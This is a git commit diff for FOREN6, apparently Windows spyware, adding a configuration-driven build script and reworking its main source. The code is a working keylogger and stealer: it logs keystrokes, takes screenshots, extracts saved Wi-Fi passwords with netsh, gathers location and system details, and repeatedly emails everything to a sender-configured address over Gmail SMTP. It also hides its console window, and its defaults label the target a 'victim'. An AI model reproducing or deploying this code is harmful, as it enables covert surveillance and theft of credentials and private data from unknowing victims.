f7b1fce4e48dfe998a2ca648b22eafd84e78f959
Anonymous Hacker <48810167+AnonymousHacker1279@users.noreply.github.com>
2021-05-21 21:26:22 -0400

    Add configuration file
    Add configuration file to modify aspects of the program.
    The build script inserts the configuration data into a copy of FOREN6 and builds the executable.

--- build.py
+++ build.py
@@ -1,34 +1,116 @@
 import os
 import platform
+import configparser
+import fileinput
+import shutil
+
 system = platform.system()
+
+config = configparser.ConfigParser()
+	
+def readConfigurationFile():
+	# Check if the configuration file exists
+	try:
+		configFile = open("config.ini")
+		configFile.close()
+		config.read("config.ini")
+	except:
+		# Create a default configuration file
+		config['general'] = {}
+		config['general']['send_info'] = True
+		config['general']['take_screenshot'] = True
+		config['general']['enable_key_logger'] = True
+		config['general']['get_wifi_info'] = True
+		config['general']['get_system_info'] = True
+
+		config['cooldown'] = {}
+		config['cooldown']['email_send_time'] = '120'
+		config['cooldown']['screenshot_time'] = '60'
+
+		config['emailInformation'] = {}
+		config['emailInformation']['info_email_receiver'] = ''
+		config['emailInformation']['sender_email_address'] = ''
+		config['emailInformation']['sender_email_password'] = ''
+
+		config['miscellaneous'] = {}
+		config['miscellaneous']['victim_name'] = 'Victim'
+
+		with open('config.ini', 'w') as configFile:
+			config.write(configFile)
+			configFile.close()
+
 if system == "Windows":
-    print("Building FOREN6...")
-    print("Downloading dependencies...")
-    print("Downloading emails...")
-    os.system("pip install emails")
-    print("Complete.")
-    print("Downloading pynput...")
-    os.system("pip install pynput==1.6.8")
-    print("Complete.")
-    print("Downloading smtplib...")
-    os.system("pip install secure-smtplib")
-    print("Complete.")
-    print("Downloading pyautogui...")
-    os.system("pip install pyautogui")
-    print("Complete.")
-    print("Downloading requests...")
-    os.system("pip install requests")
-    print("Complete.")
-    print("Downloading nuitka...")
-    os.system("pip install -U nuitka")
-    print("Completed.")
-    print("Downloading pillow")
-    os.system("pip install pillow")
-    print("Completed.")
-    print("Downloaded all dependencies.")
-    print("Creating executable...")
-    os.system(f"nuitka --mingw64 --windows-disable-console foren6.py")
+	readConfigurationFile()
 
+	# Get configuration info and insert it into a copy of the FOREN6 script
+	if "config" in locals():
+		general = config["general"]
+		cooldown = config['cooldown']
+		emailInformation = config['emailInformation']
+		miscellaneous = config['miscellaneous']
 
-    input("Finished!!!")
+		# Build a dictionary of configuration values
+		data = {
+			"info_email_receiver": emailInformation['info_email_receiver'],
+			"send_info": bool(general['send_info']),
+			"email_send_time": int(cooldown['email_send_time']),
+			"take_screenshot": bool(general['take_screenshot']),
+			"screenshot_time": int(cooldown['screenshot_time']),
+			"key_logger": bool(general['enable_key_logger']),
+			"get_wifi_info": bool(general['get_wifi_info']),
+			"get_system_info": bool(general['get_system_info']),
+			"victim_name": miscellaneous['victim_name'],
+			"sender_email_address": emailInformation['sender_email_address'],
+			"sender_email_password": emailInformation['sender_email_password']
+		}
 
+		# Make a build folder
+		if not os.path.exists(os.getcwd() + "/build"):
+			os.mkdir(os.getcwd() + "/build")
+
+		# Make a copy of FOREN6 to insert custom configurations into
+		shutil.copyfile("foren6.py", "build/foren6_1.py")
+
+		foundOldContents = False
+
+		# Locate insertion point and overwrite default options
+		for line in fileinput.input("build/foren6_1.py", inplace=True):
+			line = line.rstrip()
+
+			if line == "# <--BEGIN BUILD FILE INSERTION-->":
+				foundOldContents = True
+				print(line)
+				print("data = " + str(data))
+			elif line == "# <--END BUILD FILE INSERTION-->":
+				foundOldContents = False
+
+			if not foundOldContents:
+				print(line)
+
+	print("Building FOREN6...")
+	print("Downloading dependencies...")
+	print("Downloading emails...")
+	os.system("pip install emails")
+	print("Complete.")
+	print("Downloading pynput...")
+	os.system("pip install pynput==1.6.8")
+	print("Complete.")
+	print("Downloading smtplib...")
+	os.system("pip install secure-smtplib")
+	print("Complete.")
+	print("Downloading pyautogui...")
+	os.system("pip install pyautogui")
+	print("Complete.")
+	print("Downloading requests...")
+	os.system("pip install requests")
+	print("Complete.")
+	print("Downloading nuitka...")
+	os.system("pip install -U nuitka")
+	print("Downloading pillow")
+	os.system("pip install pillow")
+	print("Downloaded all dependencies.")
+	print("Creating executable...")
+	if os.path.exists(os.getcwd() + "/foren6.exe"): # Delete existing executables
+			os.remove(os.getcwd() + "/foren6.exe")
+	os.system(f"nuitka --mingw64 --windows-disable-console build/foren6_1.py")
+	os.rename(os.getcwd() + "/foren6_1.exe", os.getcwd() + "/foren6.exe") # Rename file
--- foren6.py
+++ foren6.py
@@ -18,195 +18,187 @@ import glob
 system = platform.system()
 
 # Configuration Information
-data = {    
-    "info_email_receiver": "", # REQUIRED
-    "send_info": True,
-    "email_send_time": 120,
-    "take_screenshot": True,
-    "screenshot_time": 60,
-    "key_logg": True,
-    "get_wifi_info": True,
-    "system_info": True,
-    "victim_name": "",
-    "sender_email_address": "", # REQUIRED
-    "sender_email_password": "" # REQUIRED
+# ANYTHING YOU PUT HERE WILL BE OVERWRITTEN BY THE BUILD SCRIPT!
+# <--BEGIN BUILD FILE INSERTION-->
+data = {
+	"info_email_receiver": "", # REQUIRED
+	"send_info": True,
+	"email_send_time": 120,
+	"take_screenshot": True,
+	"screenshot_time": 60,
+	"key_logger": True,
+	"get_wifi_info": True,
+	"get_system_info": True,
+	"victim_name": "",
+	"sender_email_address": "", # REQUIRED
+	"sender_email_password": "" # REQUIRED
 }
-
-
-
+# <--END BUILD FILE INSERTION-->
 
 
 def log_keystroke(key):
-    key = str(key).replace("'", "")
-    if key == 'Key.space':
-        key = ' '
-    if key == 'Key.shift':
-        key = ''
-    if key == "Key.enter":
-        key = '\n'
+	key = str(key).replace("'", "")
+	if key == 'Key.space':
+		key = ' '
+	if key == 'Key.shift':
+		key = ''
+	if key == "Key.enter":
+		key = '\n'
 
-    with open("log.txt", 'a') as f:
-        f.write(key)
-        
-    f.close()
+	with open("keylog.txt", 'a') as f:
+		f.write(key)
+		
+	f.close()
 
 def take_screenshot(Time):
-    while True:
-        time.sleep(Time)
-        myScreenshot = pyautogui.screenshot()
-        today = str(date.today())
-        t = time.localtime()
-        current_time = time.strftime("%H.%M.%S", t)
-        file = str(today+"_"+current_time+".png")
-        myScreenshot.save(file)
-        print("screenshot taken")
+	while True:
+		time.sleep(Time)
+		myScreenshot = pyautogui.screenshot()
+		today = str(date.today())
+		t = time.localtime()
+		current_time = time.strftime("%H.%M.%S", t)
+		file = str(today+"_"+current_time+".png")
+		myScreenshot.save(file)
+		print("screenshot taken")
 
 
 def get_wifi_info():
-    #gip
-    wifi_info_list = []
-    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
-    ipv4 = get('https://api.ipify.org').text
-    
-    wifi_info_list.append('Ipv4: {}'.format(ipv4))
-    wifi_info_list.append(f"preferred ip: {external_ip}")
+	#gip
+	wifi_info_list = []
+	external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+	ipv4 = get('https://api.ipify.org').text
+	
+	wifi_info_list.append('Ipv4: {}'.format(ipv4))
+	wifi_info_list.append(f"preferred ip: {external_ip}")
 
-    print('Ipv4: {}'.format(ipv4))
-    print("preferred ip:", external_ip)
-    #gpa
-    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
-    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-    for i in profiles:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
-        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-        try:
-            wifi_info_list.append("{:<30}|  {:<}".format(i, results[0]))
-        except IndexError:
-            wifi_info_list.append("{:<30}|  {:<}".format(i, ""))
+	print('Ipv4: {}'.format(ipv4))
+	print("preferred ip:", external_ip)
+	#gpa
+	data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+	profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+	for i in profiles:
+		results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+		results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+		try:
+			wifi_info_list.append("{:<30}|  {:<}".format(i, results[0]))
+		except IndexError:
+			wifi_info_list.append("{:<30}|  {:<}".format(i, ""))
 
-        
-    g = geocoder.ip('me')
-    cords = str(f"Location cords: {g.latlng}")
-    city = str(f"City: {g.city}")
-    country = str(f"Country: {g.country}")
-    state = str(f"State: {g.state}")
-    wifi_info_list.append(cords)
-    wifi_info_list.append(country)
-    wifi_info_list.append(city)
-    wifi_info_list.append(state)
-    
-    wifi_info_file = open("wifi_info.txt", "w")
-    for info in wifi_info_list:
-        wifi_info_file.write(str(info+"\n"))
+		
+	g = geocoder.ip('me')
+	cords = str(f"Location cords: {g.latlng}")
+	city = str(f"City: {g.city}")
+	country = str(f"Country: {g.country}")
+	state = str(f"State: {g.state}")
+	wifi_info_list.append(cords)
+	wifi_info_list.append(country)
+	wifi_info_list.append(city)
+	wifi_info_list.append(state)
+	
+	wifi_info_file = open("wifi_info.txt", "w")
+	for info in wifi_info_list:
+		wifi_info_file.write(str(info+"\n"))
 
-    wifi_info_file.close()
-
-
-
-
-
+	wifi_info_file.close()
 
 def send_info1(time_wait, data):
-    time.sleep(time_wait)
-    print("sending email")
-    files1 = []
-    files1.append("System_Info.txt")
-    files1.append("wifi_info.txt")
-    
-    for file in glob.glob("*.png"):
-        files1.append(file)
-        
+	time.sleep(time_wait)
+	print("sending email")
+	files1 = []
+	files1.append("System_Info.txt")
+	files1.append("wifi_info.txt")
+	
+	for file in glob.glob("*.png"):
+		files1.append(file)
+		
 
-    msg = MIMEMultipart()
-    msg['To'] = data["info_email_receiver"]
-    msg['From'] = data["sender_email_address"]
-    msg['Subject'] = "FOREN6 INFO"
-    
-    
-    while True:
-        try:
-            e = open("log.txt", "r")
-            e.close
-            files1.append("log.txt")
-            
-        except Exception as e:
-            print(e)
-            pass
-        print(files1)
-        for f in files1:  # add files to the message
-            print(f)
-            attachment = MIMEApplication(open(f, "rb").read())
-            attachment.add_header('Content-Disposition','attachment', filename=f)
-            msg.attach(attachment)
-            if str(f) != "log.txt":
-                os.remove(f)
-            
-        
-        files1 = []
-            
+	msg = MIMEMultipart()
+	msg['To'] = data["info_email_receiver"]
+	msg['From'] = data["sender_email_address"]
+	msg['Subject'] = "FOREN6 INFO"
+	
+	
+	while True:
+		try:
+			e = open("keylog.txt", "r")
+			e.close
+			files1.append("keylog.txt")
+			
+		except Exception as e:
+			print(e)
+		print(files1)
+		for f in files1:  # add files to the message
+			print(f)
+			attachment = MIMEApplication(open(f, "rb").read())
+			attachment.add_header('Content-Disposition','attachment', filename=f)
+			msg.attach(attachment)
+			if str(f) != "keylog.txt":
+				os.remove(f)
+			
+		
+		files1 = []
+			
 
-        server = smtplib.SMTP_SSL('smtp.gmail.com')
-        server.login(data["sender_email_address"], data["sender_email_password"])
-        server.sendmail(msg['From'], msg['To'], str(msg))
-        server.quit()
-        print("email sent")
-        time.sleep(time_wait)
+		server = smtplib.SMTP_SSL('smtp.gmail.com')
+		server.login(data["sender_email_address"], data["sender_email_password"])
+		server.sendmail(msg['From'], msg['To'], str(msg))
+		server.quit()
+		print("email sent")
+		time.sleep(time_wait)
 
 
 def system_info():
-    print("getting system info")
-    system_info_list = [] 
-    operating_system = "operating_system: "+str(platform.platform())
-    system_info_list.append(operating_system)
-    processor = "processor: "+str(platform.processor())
-    ram = "RAM: "+str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
-    mac_address = "MAC ADDRESS: "+':'.join(re.findall('..', '%012x' % uuid.getnode()))
-    local_ip = "Local ip: "+socket.gethostbyname(socket.gethostname())
-    host_name = "host name: "+socket.gethostname()
+	print("getting system info")
+	system_info_list = [] 
+	operating_system = "operating_system: "+str(platform.platform())
+	system_info_list.append(operating_system)
+	processor = "processor: "+str(platform.processor())
+	ram = "RAM: "+str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+	mac_address = "MAC ADDRESS: "+':'.join(re.findall('..', '%012x' % uuid.getnode()))
+	local_ip = "Local ip: "+socket.gethostbyname(socket.gethostname())
+	host_name = "host name: "+socket.gethostname()
 
-    system_info_list.append(processor)
-    system_info_list.append(ram)
-    system_info_list.append(mac_address)
-    system_info_list.append(local_ip)
-    system_info_list.append(host_name)
-    
-    system_info_file = open("System_Info.txt", "w")
-    for info in system_info_list:
-        system_info_file.write(str(str(info)+"\n"))
+	system_info_list.append(processor)
+	system_info_list.append(ram)
+	system_info_list.append(mac_address)
+	system_info_list.append(local_ip)
+	system_info_list.append(host_name)
+	
+	system_info_file = open("System_Info.txt", "w")
+	for info in system_info_list:
+		system_info_file.write(str(str(info)+"\n"))
 
 
 if system == "Windows":
 
-   
-    
-    keylog = data["key_logg"]
-    screenshot = data["take_screenshot"]
-    screenshot_time = data["screenshot_time"]
-    wifi_info = data["get_wifi_info"]
-    get_system_info = data["system_info"]
-    send_info_email = data["send_info"]
-    email_send = data["email_send_time"]
-    print(screenshot)
-    if screenshot:
-        screenshot_taking = threading.Thread(target=take_screenshot, args=(screenshot_time,))
-        screenshot_taking.start()
+	keylog = data["key_logger"]
+	screenshot = data["take_screenshot"]
+	screenshot_time = data["screenshot_time"]
+	wifi_info = data["get_wifi_info"]
+	get_system_info = data["get_system_info"]
+	send_info_email = data["send_info"]
+	email_send = data["email_send_time"]
+	print(screenshot)
+	if screenshot:
+		screenshot_taking = threading.Thread(target=take_screenshot, args=(screenshot_time,))
+		screenshot_taking.start()
 
-    if wifi_info:
-        wifi_thread = threading.Thread(target=get_wifi_info)
-        wifi_thread.start()
+	if wifi_info:
+		wifi_thread = threading.Thread(target=get_wifi_info)
+		wifi_thread.start()
 
-    if send_info_email:
-        email_send_info = threading.Thread(target=send_info1, args=(email_send,data,)) 
-        email_send_info.start()   
+	if send_info_email:
+		email_send_info = threading.Thread(target=send_info1, args=(email_send,data,)) 
+		email_send_info.start()   
 
-    if get_system_info:
-        sys_thread = threading.Thread(target=system_info) 
-        sys_thread.start()   
-    if keylog:
-        with Listener(on_press=log_keystroke) as l:
-            l.join()
+	if get_system_info:
+		sys_thread = threading.Thread(target=system_info) 
+		sys_thread.start()   
+	if keylog:
+		with Listener(on_press=log_keystroke) as l:
+			l.join()
 
 
-        
+		
 else:
     print("Only Windows machines are permitted!")
